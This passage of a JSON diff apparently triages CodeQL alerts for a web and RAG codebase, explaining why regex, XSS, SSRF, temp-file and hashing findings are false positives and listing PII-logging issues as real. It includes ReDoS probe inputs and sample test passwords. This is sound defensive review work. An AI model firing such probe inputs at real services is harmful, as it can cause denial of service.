+   "reason": "CANONICAL_URL is built from hardcoded compile-time constants (SLUG=\"e23-employee-kitas-guide\", CANONICAL_URL=`/visas/${SLUG}`) inside a Playwright E2E spec file \u2014 never influenced by any runtime user input, and this file only executes under `npx playwright test` in CI, never shipped to or reachable by end users despite the 'frontend-prod' surface tag. The incomplete-backslash-escaping regex-construction pattern is real as a general anti-pattern, but there is no attacker-controlled data anywhere in this flow."
+  },
+  {
+   "number": 6272,
+   "path": "infra/eventbus/regulatory_ingest_runner.py",
+   "line": 173,
+   "reason": "html_text comes from curl-fetching a fixed government JDIH regulation URL (jdih_url), not user input, and the output `clean` is written to a .txt file consumed as plain-text LLM/RAG ingestion content (never re-rendered in a browser/HTML context \u2014 no dangerouslySetInnerHTML-equivalent sink exists downstream). Even if the specific `</script>` variant regex misses a malformed `</script >`, the very next line (`re.sub(r\"<[^>]+>\", \" \", clean)`) strips ALL remaining tag markup generically, so no live tag can survive \u2014 worst case is inert JS text leaking into the extracted content (a data-quality issue, not an XSS/injection vector, since there is no HTML rendering sink)."
+  },
+  {
+   "number": 6122,
+   "path": "apps/mata-garuda/mata_garuda/agents/intel_scraper_bridge.py",
+   "line": 52,
+   "reason": "Per this module's own CLAUDE.md, output only ever flows into Redis `garuda:raw` for internal NER/entity-extraction consumption ('what NER sees as content') \u2014 never into apps/mouth, any frontend, or any browser-rendering context (OSINT one-way-IN invariant). Even where the regex misses a `</script >` variant, the subsequent `_RE_TAG.sub(\" \", text)` catch-all strips the tag markup itself, leaving at most inert JS text in the NER input \u2014 not an executable/rendered sink."
+  },
+  {
+   "number": 4703,
+   "path": "apps/backend-rag/backend/app/routers/hr_late_reply.py",
+   "line": 202,
+   "reason": "token is a Query param (attacker-controlled at the HTTP layer), and _render_form does interpolate it into HTML with zero escaping \u2014 that part of the alert is accurate. But the code path only reaches _render_form when `secrets.compare_digest(row[\"reply_token\"], token)` succeeds (line 191), which requires attacker-supplied token to be byte-identical to the server-generated reply_token. That value is always produced by `secrets.token_urlsafe(32)` (verified in attendance_monitor.py:905), whose charset is strictly [A-Za-z0-9_-] \u2014 no HTML-special characters. An attacker cannot smuggle `<script>` through this gate without already possessing the exact valid secret, at which point no injection is needed to 'exploit' anything."
+  },
+  {
+   "number": 3796,
+   "path": "scripts/coverage_trend.py",
+   "line": 143,
+   "reason": "Deprecated tempfile.mktemp is a real CWE-377 anti-pattern in general, but this script runs pytest coverage locally/via cron on Zero's own single-user macOS machines (Pro/Mini), never on a shared multi-tenant host. The symlink-preplant race requires another local user with write access to the same temp directory, which does not exist here. Note the file's own `_atomic_write()` helper (line 126) correctly uses `tempfile.mkstemp` \u2014 this specific call at 143 is the outlier."
+  },
+  {
+   "number": 3597,
+   "path": "apps/backend-rag/backend/app/routers/system_observability.py",
+   "line": 116,
+   "reason": "table is validated by `table.replace(\"_\", \"\").isalnum()` (rejects quotes, semicolons, spaces, backslashes \u2014 anything that could break out of the double-quoted identifier) AND by an EXISTS check against information_schema.tables using a parameterized query before quoted_table is ever built (lines 96-109). The endpoint also requires `Depends(get_admin_user)` \u2192 `Depends(get_current_user)`, real JWT auth. An attacker cannot supply SQL metacharacters through `table` (isalnum rejects them), and cannot reach this code at all without a valid admin session."
+  },
+  {
+   "number": 3396,
+   "path": "apps/evaluator/core_guardian/watchdog.py",
+   "line": 170,
+   "reason": "Same reasoning as scripts/coverage_trend.py:143 \u2014 this is core_guardian, an internal self-healing/testing organ that runs locally on Zero's own dev/CI machines only, single-user, no adversarial co-tenant able to win the mktemp race window."
+  },
+  {
+   "number": 3395,
+   "path": "apps/evaluator/core_guardian/surgeon.py",
+   "line": 395,
+   "reason": "Identical pattern and identical single-user-machine reasoning as watchdog.py:170 (same core_guardian module, sibling function)."
+  },
+  {
+   "number": 3334,
+   "path": "apps/mouth/scripts/generate-llms-full.ts",
+   "line": 177,
+   "reason": "This is a build-time content-generation script (generates llms.txt at `npm run build` / content-pipeline time), not runtime request-handling code despite the 'frontend-prod' tag. LLMS_TXT_PATH is a fixed project-relative path, not attacker input. The TOCTOU race the rule flags requires an adversarial local process racing the check-then-write window on a shared host; this runs single-tenant on a dev machine or an isolated CI job."
+  },
+  {
+   "number": 2315,
+   "path": "apps/admin-dashboard/lib/security/xss.ts",
+   "line": 29,
+   "reason": "Repo-wide grep confirms sanitizeSqlForDisplay is exported from lib/security/xss.ts and re-exported via lib/utils/index.ts, but has ZERO call sites anywhere else in the codebase (admin-dashboard or otherwise) \u2014 dead code. There is also zero dangerouslySetInnerHTML anywhere in apps/admin-dashboard, so even a perfectly-sanitized string from this function has no unsafe-HTML sink to reach today. The regex weakness is real if this function is ever wired up, but currently unreachable."
+  },
+  {
+   "number": 2314,
+   "path": "apps/admin-dashboard/lib/security/xss.ts",
+   "line": 31,
+   "reason": "Same function/finding pair as n=2315 (companion bad-tag-filter alert on the same regex literal) \u2014 confirmed dead code with no callers and no dangerouslySetInnerHTML sink anywhere in apps/admin-dashboard."
+  },
+  {
+   "number": 2010,
+   "path": "apps/mouth/scripts/generate_kbli_data.js",
+   "line": 38,
+   "reason": "Build-time/one-off content-generation script (KBLI data generation, run manually or in a content pipeline), not runtime frontend code despite the 'frontend-prod' tag. KEYWORDS_FILE is a fixed script-relative path, not attacker-controlled, and the execution context is single-tenant (dev machine or isolated CI job) \u2014 no adversarial process to win the TOCTOU race."
+  },
+  {
+   "number": 314,
+   "path": "apps/backend-rag/backend/app/routers/system_observability.py",
+   "line": 120,
+   "reason": "Same quoted_table as n=3597 in the same function \u2014 already validated via `table.replace(\"_\",\"\").isalnum()` plus the information_schema.tables EXISTS check before this line executes, and the endpoint requires admin auth via Depends(get_admin_user). limit/offset are passed as genuine parameterized placeholders ($1/$2), not interpolated."
+  },
+  {
+   "number": 10,
+   "path": "apps/admin-dashboard/app/api/postgres/query/route.ts",
+   "line": 38,
+   "reason": "table is validated immediately above via a parameterized existence check against information_schema.tables (`WHERE table_schema = 'public' AND table_name = $1`, line 28-31) \u2014 the request 400s before reaching line 38 unless `table` exactly matches a real, already-existing table name in the schema. This mirrors the Python system_observability.py pattern. The route is also gated by middleware.ts (admin JWT required; the middleware's own comment explicitly calls out /api/postgres/* as one of the routes it was added to protect). limit/offset use real parameterized placeholders."
+  },
+  {
+   "number": 7780,
+   "path": "apps/backend-rag/backend/core/legal/structure_parser.py",
+   "line": 247,
+   "reason": "PARAGRAF_PATTERN = r'^Paragraf\\s+(\\d+)\\s+(.+?)(?=\\n|$)'. Literal 'Paragraf' is immediately after the multiline anchor (no \\s* buffer), same safe shape as BAB_PATTERN. Empirically tested CodeQL's suggested pump ('Paragraf 0 ' + repeated double-spaces) up to 320,000 chars: clean 2x-for-2x (O(n)) growth, no blowup."
+  },
+  {
+   "number": 7779,
+   "path": "apps/backend-rag/backend/core/legal/structure_parser.py",
+   "line": 211,
+   "reason": "BAGIAN_PATTERN = r'^Bagian\\s+([A-Za-z]+|\\d+)\\s+(.+?)(?=\\n|$)'. Same safe anchor-then-literal shape. Empirically tested CodeQL's suggested pump ('Bagian a ' + repeated double-spaces) up to 320,000 chars: clean linear growth."
+  },
+  {
+   "number": 7776,
+   "path": "apps/backend-rag/backend/core/legal/metadata_extractor.py",
+   "line": 88,
+   "reason": "TOPIC_PATTERN = r'TENTANG\\s+(.+?)(?=DENGAN RAHMAT|Menimbang|Mengingat|$)' with DOTALL. The lazy .+? can always terminate at '$' (end of string), so there is no reachable total-failure case forcing exhaustive backtracking \u2014 worst case is a single linear scan to end. Empirically tested CodeQL's pump ('TENTANG ' + repeated double-spaces) up to 320,000 chars: clean 2x-for-2x growth."
+  },
+  {
+   "number": 7775,
+   "path": "apps/backend-rag/backend/core/legal/cleaner.py",
+   "line": 55,
+   "reason": "Same DOTALL lazy-.+?-terminates-at-$ shape as #7776: once the literal phrase is found, the match extends to the next \\n or end of string in one linear pass and (being global re.sub) consumes past all further phrase repetitions in the same match. Empirically tested with the exact CodeQL pump (phrase repeated up to 51,200 times, ~1.5MB) both with and without interspersed newlines: clean linear growth (ratio ~4x for 4x input), no blowup."
+  },
+  {
+   "number": 7774,
+   "path": "apps/backend-rag/backend/core/legal/chunker.py",
+   "line": 293,
+   "reason": "This local pattern has no literal-after-an-anchor-with-\\s*-in-between ambiguity like PASAL_PATTERN \u2014 matches only start where a literal '(' + digit occurs, and .+? (DOTALL) always reaches the '$' fallback. Empirically tested with both space-padding and newline-padding pumps up to 160,000 chars: consistently ~0.0000-0.0002s, no growth."
+  },
+  {
+   "number": 7482,
+   "path": "apps/backend-rag/backend/services/autonomous_lab/receipt_safety.py",
+   "line": 42,
+   "reason": "EMAIL_PATTERN = r'(?i)(?<![A-Z0-9._%+-])[A-Z0-9._%+-]+@[A-Z0-9.-]+\\.[A-Z]{2,}(?![A-Z0-9._%+-])'. The negative lookbehind before the user-part quantifier means any restart position immediately preceded by another identifier char is rejected in O(1) \u2014 this prunes almost every one of the O(n) candidate restart positions that would otherwise each cost O(n). Directly tested THIS pattern (with the lookaround) with both .search() and .sub() on a guaranteed-no-match string ('a@'+'a'*n+'%') up to 128,000 chars: clean linear growth in both cases (0.0037s at 128000), confirming the lookbehind neutralizes the theoretical ambiguity. Contrast with #7409 below, which is the same core email shape MINUS the lookaround and IS exploitable."
+  },
+  {
+   "number": 6863,
+   "path": "apps/backend-rag/backend/services/oracle/cross_oracle_synthesis_service.py",
+   "line": 482,
+   "reason": "The lazy (.*?)  is DOTALL and its lookahead always has a guaranteed fallback ('\\Z' = absolute end of string), so the overall match can never truly fail once the literal section header is found \u2014 worst case is one linear scan to the end. Empirically tested CodeQL's suggested pump ('## Timeline\\n' + many '\\n ' repetitions, same pattern family) up to 320,000 chars: clean linear growth (ratio ~4x for 4x input)."
+  },
+  {
+   "number": 6862,
+   "path": "apps/backend-rag/backend/services/oracle/cross_oracle_synthesis_service.py",
+   "line": 468,
+   "reason": "Identical pattern family and same empirical linear-growth result as #6863/#253."
+  },
+  {
+   "number": 6861,
+   "path": "apps/backend-rag/backend/services/oracle/cross_oracle_synthesis_service.py",
+   "line": 459,
+   "reason": "Identical pattern family and same empirical linear-growth result as #6863/#253."
+  },
+  {
+   "number": 6384,
+   "path": "apps/mouth/src/app/portal/(authenticated)/matters/[id]/page.test.tsx",
+   "line": 76,
+   "reason": "This is a Vitest test-file assertion (never shipped to or executed in the production bundle, despite the 'frontend-prod' surface label being applied to the whole app tree). The unanchored regex is used to check that a hostname substring is ABSENT anywhere in the rendered DOM text (an info-leak regression test), not to validate/allow-list a URL or gate a network request/redirect \u2014 the exact threat model the missing-regexp-anchor rule targets (SSRF-style host-check bypass) doesn't apply because no security decision is made from the match."
+  },
+  {
+   "number": 253,
+   "path": "apps/backend-rag/backend/services/oracle/cross_oracle_synthesis_service.py",
+   "line": 452,
+   "reason": "Same DOTALL lazy-.+?-with-guaranteed-\\Z-fallback shape as #6863/#6862/#6861. Directly tested with CodeQL's own suggested pump ('## Timeline\\n' + many '\\n ' repetitions) up to 320,000 chars: clean linear growth (ratio ~4x for 4x input, e.g. 0.00006s\u21920.00022s\u21920.00087s), no blowup."
+  },
+  {
+   "number": 8192,
+   "path": "scripts/tests/test_worker_plane_review_packet.py",
+   "line": 606,
+   "reason": "Test function test_existing_store_rejects_symlink_or_writable_artifact deliberately mutates permissions of a pytest tmp_path fixture (artifact.review_dir under tmp_path/'packets') to simulate an existing store state and assert packet.write_artifacts rejects a symlinked artifact. The directory is ephemeral, created and destroyed within the test process, never reachable outside the local test run, and holds no secret/PII content (test fixture bytes only)."
+  },
+  {
+   "number": 8191,
+   "path": "scripts/tests/test_worker_plane_review_packet.py",
+   "line": 603,
+   "reason": "Same test (symlink-rejection case) temporarily loosens artifact.packet_path (a file under tmp_path) so it can be unlinked and replaced with a symlink to a scratch file, purely to exercise packet.write_artifacts's symlink-rejection guard. Ephemeral test fixture, no production/secret data."
+  },
+  {
+   "number": 8190,
+   "path": "scripts/tests/test_worker_plane_review_packet.py",
+   "line": 602,
+   "reason": "Same test: review_dir under tmp_path is temporarily re-opened to rwxr-xr-x so its children can be modified before the test re-locks it back to 0o555 at line 606. Ephemeral pytest fixture directory, no sensitive content."
+  },
+  {
+   "number": 8189,
+   "path": "scripts/tests/test_worker_plane_review_packet.py",
+   "line": 586,
+   "reason": "test_existing_store_rejects_extra_file_and_noncanonical_receipt re-locks the tmp_path review_dir to read-only after tampering with the receipt file, to assert packet.write_artifacts detects a non-canonical receipt. Ephemeral test fixture, no secret/PII content."
+  },
+  {
+   "number": 8188,
+   "path": "scripts/tests/test_worker_plane_review_packet.py",
+   "line": 585,
+   "reason": "Same test locks a rewritten (non-canonical JSON formatting) receipt file back to read-only inside tmp_path, purely to reproduce the 'canonical receipt' validation failure path. Ephemeral test data, no sensitive content."
+  },
+  {
+   "number": 8187,
+   "path": "scripts/tests/test_worker_plane_review_packet.py",
+   "line": 582,
+   "reason": "Same test temporarily unlocks receipt_path under tmp_path to rewrite its JSON body before re-locking. Ephemeral pytest fixture, no secret/PII content."
+  },
+  {
+   "number": 8186,
+   "path": "scripts/tests/test_worker_plane_review_packet.py",
+   "line": 580,
+   "reason": "Same test unlocks the deliberately-injected 'extra.txt' file under tmp_path so it can be unlinked, part of asserting the 'exactly four files' validation. Ephemeral test data."
+  },
+  {
+   "number": 8185,
+   "path": "scripts/tests/test_worker_plane_review_packet.py",
+   "line": 579,
+   "reason": "Same test re-opens review_dir under tmp_path for write access to clean up the injected extra file before re-locking for the next assertion phase. Ephemeral pytest fixture."
+  },
+  {
+   "number": 8184,
+   "path": "scripts/tests/test_worker_plane_review_packet.py",
+   "line": 574,
+   "reason": "test_existing_store_rejects_extra_file_and_noncanonical_receipt re-locks review_dir under tmp_path to read-only after injecting an unauthorized extra file, to assert write_artifacts rejects the store. Ephemeral test fixture."
+  },
+  {
+   "number": 8183,
+   "path": "scripts/tests/test_worker_plane_review_packet.py",
+   "line": 573,
+   "reason": "Same test locks the newly-written extra.txt (under tmp_path) to read-only, mimicking the immutability convention of the real packet store, purely to test the 'exactly four files' guard. Ephemeral test data."
+  },
+  {
+   "number": 8182,
+   "path": "scripts/tests/test_worker_plane_review_packet.py",
+   "line": 570,
+   "reason": "Test opens the tmp_path review_dir for write so it can inject an unauthorized 'extra.txt' file, first step of testing the extra-file rejection path. Ephemeral pytest fixture, no sensitive content."
+  },
+  {
+   "number": 8181,
+   "path": "scripts/launch_worker_plane_review_panel.py",
+   "line": 834,
+   "reason": "_write_staged_file makes a just-written staging file read-only-for-everyone as an intentional tamper-evidence/immutability measure before it is hard-linked into the local review-output directory (_publish_new_files, called only from local CLI review-panel tooling run by the operator on a single-user dev Mac). The payload is council-review artifacts (Gemini/Codex/Kimi outputs on architecture review packets), not credentials or client PII, and there is no network-reachable consumer of this file \u2014 it never leaves the local machine's disk. World-readable exposure has no practical attacker path on a single-user workstation."
+  },
+  {
+   "number": 8180,
+   "path": "scripts/freeze_worker_plane_review.py",
+   "line": 919,
+   "reason": "Same immutability pattern in the content-addressed review-packet store: after writing packet/manifest/route-config/receipt files, the temp directory is locked to r-xr-xr-x before an atomic os.replace into the CAS store. Per the module's own docstring, the covered content is explicitly required to be non-PII architecture documents (this invocation binds 10 design docs), and the tool runs strictly locally as CLI tooling on the operator's dev machine \u2014 no network exposure."
+  },
+  {
+   "number": 8179,
+   "path": "scripts/freeze_worker_plane_review.py",
+   "line": 918,
+   "reason": "Same function as 8180: iterates the freshly-written temp directory's children (packet/manifest/route-config/receipt) and makes each read-only-for-everyone before the atomic install into the CAS store, for tamper-evidence not secrecy. Local-only tooling, non-secret architecture-review content by design."
+  },
+  {
+   "number": 7689,
+   "path": "apps/mata-garuda/mata_garuda/workers/plist_watchdog.py",
+   "line": 177,
+   "reason": "_heal() reinstalls a vanished LaunchAgent plist by copying the repo-tracked snapshot (infra/launchagents/com.matagaruda.*.plist) to ~/Library/LaunchAgents and chmod'ing it to 0o644 (the standard launchd-loadable plist permission). I verified the actual snapshot content (e.g. com.matagaruda.watcher.daily.plist) contains only Label/ProgramArguments/schedule/log-paths/PATH and HOME env vars \u2014 no embedded OAuth tokens or credentials (CLAUDE.md's Golden Rule 6 'No Hardcoded Secrets' holds here; tokens are injected later by a separate shell wrapper, not present in this XML). 0o644 is also launchd's expected/required mode for a loadable plist. No secret exposure."
+  },
+  {
+   "number": 7368,
+   "path": "scripts/intake_gate_count_pusher.py",
+   "line": 47,
+   "reason": "Creates/opens a flock-based single-instance lock file under ~/.cell-bridge-state. The file's only purpose is to hold an fcntl advisory lock (existence + fd, no meaningful written payload) for this Pro cron worker; per the module docstring the actual data it pushes is a non-PII integer count. World-readability of an empty/trivial lock file on a single-user dev machine is not a disclosure vector."
+  },
+  {
+   "number": 7352,
+   "path": "scripts/wa_mirror_intake_sweeper.py",
+   "line": 128,
+   "reason": "Same flock single-instance lock-file pattern as intake_gate_count_pusher.py, in ~/.cell-bridge-state. Lock file holds no data of interest; only used for fcntl.flock coordination between cron ticks on the local Pro machine."
+  },
+  {
+   "number": 7335,
+   "path": "scripts/wa_media_pull_worker.py",
+   "line": 139,
+   "reason": "Same flock single-instance lock-file pattern as the other cron workers in this family (_acquire_lock_or_exit). No sensitive payload is written to the lock file itself; it exists solely to be flock()'d."
+  },
+  {
+   "number": 7259,
+   "path": "scripts/tests/test_escalations_s3.py",
+   "line": 124,
+   "reason": "test_concurrent_append_during_truncate_no_corruption writes synthetic JSON lines (append counters + timestamps, no real data) to a file under pytest tmp_path, from four hammering writer threads, purely to prove O_APPEND atomicity during a concurrent rotate(). Ephemeral test fixture, fabricated content, no secrets/PII."
+  },
+  {
+   "number": 6300,
+   "path": "apps/cell/scripts/skills_bridge_consumer.py",
+   "line": 92,
+   "reason": "_acquire_lock_or_exit creates the same kind of flock single-instance guard file (~/.cell-bridge-state/skills_bridge.lock) as the other cron shims in this file family. The lock file carries no payload; it exists only to be flock()'d for CORR-G6 single-instance enforcement."
+  },
+  {
+   "number": 4220,
+   "path": "scripts/sentinel_lib/escalations.py",
+   "line": 66,
+   "reason": "write_escalation appends a JSON escalation record to shared/escalations_pro.jsonl on the local Pro machine (per-machine append-only log of internal engineering escalations, not client PII per the module's own architecture doc). 0o644 matches the filesystem default (umask-applied mode of a plain create would be similarly world-readable) and the file lives on a single-user development machine with no other local OS accounts, so there is no unauthorized-reader threat model here."
+  },
+  {
+   "number": 3665,
+   "path": "scripts/system_doctor.py",
+   "line": 1307,
+   "reason": "fix_permissions() only chmod's a fixed, hardcoded allowlist (ACTIVE_SCRIPTS = {'auto_test.sh', 'auto_sentinel.sh', 'auto_kb_ingest.sh', 'auto_judgement_day.sh', 'ollama_cron_window.sh'}) to make them executable (chmod +x, the standard/expected mode for a runnable cron shell script). No externally-controlled path or filename reaches this sink, and the scripts' content is local automation shell code, not secrets."
+  },
+  {
+   "number": 8060,
+   "path": "scripts/intake_identity_backfill.py",
+   "line": 720,
+   "reason": "value_md5 is written into a JSON provenance blob purely as a compare-and-swap / audit fingerprint (checked later at line 1128: `if current_md5 != prov.get('value_md5')`) to detect whether the row changed between dry-run and apply. It is not a confidentiality control: the raw passport/KITAS number is written in cleartext into the same `clients` row by this same script, so the MD5 collision weakness protects nothing that isn't already stored unprotected. Also an operator-run local backfill script (surface=tooling), never network-reachable."
+  },
+  {
+   "number": 8047,
+   "path": "apps/backend-rag/backend/services/knowledge_graph/incremental_builder.py",
+   "line": 88,
+   "reason": "The truncated hash is only used as a log-line fingerprint ('key fp=%s') to let an operator visually correlate which of several Gemini keys is in use, without printing key material. The code comment explicitly states this was added as a remediation for a prior CodeQL alert (#4019) about leaking the key in clear text. It is not password/credential storage or verification."
+  },
+  {
+   "number": 4656,
+   "path": "apps/backend-rag/backend/services/rag/kg_subgraph_property.py",
+   "line": 86,
+   "reason": "The module maintains two independent singletons, `_client_verified` and `_client_unverified` (lines 24-25), created specifically 'to avoid the singleton bug where verify=False and verify=True would share state' per the module docstring/comment (lines 22-23). This call site requests verify=True and _get_client() returns/creates `_client_verified`, which never has verify=False set. Certificate validation is not disabled for this call."
+  },
+  {
+   "number": 3671,
+   "path": "scripts/system_doctor.py",
+   "line": 719,
+   "reason": "collect_ssl_certs() only calls ssl.create_default_context() with no arguments and never touches ctx.minimum_version/maximum_version/options anywhere \u2014 confirmed by grepping the whole file for ssl-related tokens, which returns exactly this one line. Empirically verified on this repo's Python 3.11 runtime: `ssl.create_default_context().minimum_version == 771`, which is `ssl.TLSVersion.TLSv1_2` \u2014 TLSv1 (769) and TLSv1_1 (770) are not negotiable by default. CodeQL's py/insecure-protocol modeling appears to assume an older Python/OpenSSL default that predates this hardening; there is no code path here that actually permits the weak versions the alert names. Also this function only reads certificate expiry dates for a monitoring dashboard (no sensitive data exchanged)."
+  },
+  {
+   "number": 3626,
+   "path": "apps/backend-rag/backend/services/rag/kg_subgraph_property.py",
+   "line": 180,
+   "reason": "Same reasoning as #4656 \u2014 _fetch_gistaru_provider explicitly requests the verified singleton (verify=True), which is architecturally isolated from the unverified one used only by the Badung branch. Certificate validation is active for this national GISTARU ArcGIS REST call."
+  },
+  {
+   "number": 2067,
+   "path": "apps/backend-rag/backend/services/rag/evaluation/ab_testing.py",
+   "line": 193,
+   "reason": "This MD5 call implements classic consistent-hashing for deterministic A/B-test variant bucketing (assign_variant): the hash output is normalized into [0,1) and compared against a split_ratio to pick a variant, purely for reproducible experiment assignment. It makes no confidentiality or integrity claim about user_id \u2014 MD5's collision-resistance weakness is irrelevant to this non-cryptographic bucketing use, and knowledge of the hash reveals nothing about user_id that CodeQL's 'sensitive data' rule is designed to protect against."
+  },
+  {
+   "number": 359,
+   "path": "apps/backend-rag/tests/services/rag/agentic/test_llm_gateway_security.py",
+   "line": 81,
+   "reason": "This is inside test_user_authentication_flow, a unit test that builds an entirely local, in-memory mock auth system (users dict hardcoded with plaintext test passwords 'admin123'/'user123'/'readonly123') to exercise gateway authorization/permission logic. It never runs in production, processes no real credentials, and is not reachable by any network actor \u2014 it's the exact 'developer-supplied, never network-reachable' shape the task description calls out as a canonical false positive."
+  },
+  {
+   "number": 2151,
+   "path": "apps/mouth/src/lib/logging/cases-logger.ts",
+   "line": 85,
+   "reason": "This sessionId is only ever embedded in structured log payloads sent write-only to POST /api/logs (sendToLoggingService, verified \u2014 the only consumer in the file). There is no endpoint that retrieves anything keyed by this id, and it never gates access to any protected resource \u2014 it is a pure log-correlation string for debugging, not a session/auth token."
+  },
+  {
+   "number": 21,
+   "path": "apps/mouth/src/lib/analytics.ts",
+   "line": 27,
+   "reason": "This sessionId is only attached to AnalyticsEvent objects and POSTed write-only to `process.env.NEXT_PUBLIC_ANALYTICS_ENDPOINT` (sendAnalyticsEvent, verified as the only consumer). It's pure client-side telemetry correlation, not used to retrieve or gate access to any stored resource \u2014 no read-back-by-session_id endpoint exists for it."
+  },
+  {
+   "number": 16,
+   "path": "apps/mouth/e2e/zantara/memory-direct-test.spec.ts",
+   "line": 137,
+   "reason": "This is a Playwright e2e test file (apps/mouth/e2e/...) \u2014 dev/CI-only tooling, never shipped to production or reachable by an external attacker. Additionally, even on its merits, the endpoint it exercises (GET /api/bali-zero/conversations/history, apps/backend-rag/backend/app/routers/conversations.py) IS properly scoped: it requires `Depends(get_current_user)` (real JWT) and queries `WHERE user_id = $1 AND session_id = $2` (verified lines ~382-399) \u2014 unlike the agentic_rag.py path used by the live chat UI, this router correctly ties session_id to the JWT-verified user, so guessing another user's session_id here returns nothing."
+  },
+  {
+   "number": 3623,
+   "path": "apps/backend-rag/backend/services/integrations/zoho_email_service.py",
+   "line": 1000,
+   "reason": "message_id/attachment_id come from FastAPI Path params in routers/zoho_email.py:725-728 (download_attachment), so they are user-controlled, but self.api_domain is settings.zoho_api_domain (pydantic Field default 'https://mail.zoho.com', env ZOHO_API_DOMAIN) \u2014 never request-derived. The tainted values only fill a path segment appended after the fixed host; httpx parses the whole f-string as one URL so an embedded 'http://' inside message_id cannot become a new authority. Starlette's default str converter also forbids literal '/' in {message_id}, limiting it to a single segment. No host redirection is achievable \u2014 not exploitable as SSRF."
+  },
+  {
+   "number": 3622,
+   "path": "apps/backend-rag/backend/services/integrations/zoho_email_service.py",
+   "line": 252,
+   "reason": "Shared _request() helper is called from ~11 sites; the 5 taint paths CodeQL reports converge here via folder_id/message_id path segments (e.g. content_path = f\"/folders/{folder_id}/messages/{message_id}/content\" at line 477) baked into the 'endpoint' argument. self.api_domain is the same fixed settings.zoho_api_domain as alert 3623. Same reasoning: only path segments after a hardcoded host are tainted; host/scheme cannot be redirected via string concatenation into a downstream httpx URL."
+  },
+  {
+   "number": 3621,
+   "path": "apps/backend-rag/backend/services/integrations/google_drive_service.py",
+   "line": 443,
+   "reason": "self.API_BASE is the class-level hardcoded literal 'https://www.googleapis.com/drive/v3' (line 43) \u2014 never user-controlled. current_id originates from folder_id, a Path/body param reachable from routers/team_drive.py and routers/google_drive.py, but it only ever fills the trailing path segment; the host is fixed to Google's real API. No SSRF host redirection possible."
+  },
+  {
+   "number": 3620,
+   "path": "apps/backend-rag/backend/services/integrations/google_drive_service.py",
+   "line": 407,
+   "reason": "Same API_BASE constant as 3621. file_id reaches get_file() from routers/google_drive.py:440 (service.get_file(\"SYSTEM\", file_id), file_id from request) \u2014 a single Path-param segment on a fixed Google host. No host-redirection vector."
+  },
+  {
+   "number": 2149,
+   "path": "apps/mouth/src/app/chat/actions.ts",
+   "line": 157,
+   "reason": "BACKEND_URL (line 53-54) is `process.env.BACKEND_RAG_URL || \"https://nuzantara-rag.fly.dev\"` \u2014 a build/deploy-time env var, never request-derived. `id` is the deleteConversation Server Action's argument (typed `number` in the exported signature); even though a caller could bypass the TS type at the wire level and send an arbitrary string, it only fills the trailing path segment appended after the fixed BACKEND_URL host \u2014 it cannot change which host the server-side fetch targets. Not exploitable as SSRF."
+  },
+  {
+   "number": 798,
+   "path": "apps/backend-rag/backend/app/routers/system_observability.py",
+   "line": 208,
+   "reason": "settings.qdrant_url is a pydantic Field (default 'http://localhost:6333', env QDRANT_URL) \u2014 server config, not request data. `collection` is a Query param on an admin-only endpoint (Depends(get_admin_user)) at routers/system_observability.py:190-194. It only fills a path segment after the fixed internal Qdrant host; an embedded scheme in `collection` cannot cause httpx to switch authority. Not SSRF-exploitable, and additionally gated to admins."
+  },
+  {
+   "number": 797,
+   "path": "apps/backend-rag/backend/app/utils/qdrant_debugger.py",
+   "line": 216,
+   "reason": "The request URL is a relative path ('/collections/{collection_name}') resolved against the client's fixed base_url (self.qdrant_url, from config settings \u2014 same as alert 798). Because the string starts with '/', httpx treats it as a path relative to the existing origin; an attacker-controlled collection_name embedding 'http://' mid-string cannot be reinterpreted as a new scheme+authority. collection_name reaches here from routers/debug.py get_collection_stats(collection_name) \u2014 a debug endpoint, but even so, no host redirection is possible."
+  }
+ ],
+ "real": [
+  {
+   "number": 7784,
+   "path": "apps/backend-rag/backend/services/integrations/zoho_email_service.py",
+   "line": 596,
+   "surface": "backend-prod",
+   "reason": "Logs the full recipient/cc/bcc email address lists and subject preview for every outbound email at INFO level in backend-prod. Any caller of send_email() (internal API, automation) causes real client/team email addresses to be written to application logs in clear text.",
+   "fix_hint": "Log recipient counts and a redacted/truncated identifier instead of full email lists, or drop to DEBUG with masking."
+  },
+  {
+   "number": 6458,
+   "path": "apps/backend-rag/backend/services/whatsapp_onboarding_detector.py",
+   "line": 206,
+   "surface": "backend-prod",
+   "reason": "Logs a dict containing the WhatsApp lead's full name, email, phone number, nationality and business description in clear text at INFO level. This is user-supplied data extracted from an inbound WhatsApp message (attacker/user reaches this by simply messaging the bot), landing in production logs.",
+   "fix_hint": "Log only a redacted summary (e.g. hash of phone, or just the detected intent) instead of the full PII payload."
+  },
+  {
+   "number": 6456,
+   "path": "apps/backend-rag/backend/app/streaming.py",
+   "line": 380,
+   "surface": "backend-prod",
+   "reason": "CodeQL tags this '(password)' but no password value is involved \u2014 user_id is the authenticated caller's own session identifier (email/role/id), sourced from JWT-decode/auth. Likely a field-insensitive taint bleed from the auth/JWT payload object; this is standard audit-trail logging of one's own identity, not credential disclosure."
+  },
+  {
+   "number": 6455,
+   "path": "apps/backend-rag/backend/app/streaming.py",
+   "line": 361,
+   "surface": "backend-prod",
+   "reason": "Same as #6456 \u2014 logs the authenticated caller's own email, mislabeled '(password)' by CodeQL. No credential value present in the sink."
+  },
+  {
+   "number": 6454,
+   "path": "apps/backend-rag/backend/app/streaming.py",
+   "line": 514,
+   "surface": "backend-prod",
+   "reason": "Logs a numeric timeout constant and the caller's own user_id. No password/secret value reaches this sink."
+  },
+  {
+   "number": 6453,
+   "path": "apps/backend-rag/backend/app/streaming.py",
+   "line": 477,
+   "surface": "backend-prod",
+   "reason": "Logs the authenticated caller's own email as a save-confirmation trace. Not a password/credential."
+  },
+  {
+   "number": 6452,
+   "path": "apps/backend-rag/backend/app/streaming.py",
+   "line": 138,
+   "surface": "backend-prod",
+   "reason": "Logs user_id (session identity) and an exception object, not a password/secret."
+  },
+  {
+   "number": 6451,
+   "path": "apps/backend-rag/backend/app/streaming.py",
+   "line": 118,
+   "surface": "backend-prod",
+   "reason": "Same pattern as #6455 (GET variant of the same endpoint pair) \u2014 logs the caller's own email, not a password."
+  },
+  {
+   "number": 6450,
+   "path": "apps/backend-rag/backend/app/streaming.py",
+   "line": 261,
+   "surface": "backend-prod",
+   "reason": "Same as #6454, GET-endpoint variant. No password/secret in the logged values."
+  },
+  {
+   "number": 5544,
+   "path": "apps/backend-rag/backend/db/repositories/client_repository.py",
+   "line": 150,
+   "surface": "backend-prod",
